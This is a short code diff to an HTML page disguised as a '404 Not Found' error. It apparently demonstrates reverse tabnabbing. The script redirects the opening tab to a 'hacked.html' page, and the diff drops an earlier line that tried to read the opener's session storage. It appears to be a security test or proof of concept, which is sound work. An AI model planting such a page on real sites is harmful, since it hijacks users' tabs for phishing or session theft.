@@ -4,8 +4,7 @@
 <h1>404 Not Found</h1>
 <script>
 	if (window.opener) {
-		//opener.location = 'https://cdurland.github.io/hacked.html';
-        alert(opener.sessionStorage.session);
+		opener.location = 'https://cdurland.github.io/hacked.html';
 	} else {
 		document.querySelector('h1').innerHTML = 'FAIL FAIL FAIL';
 	}
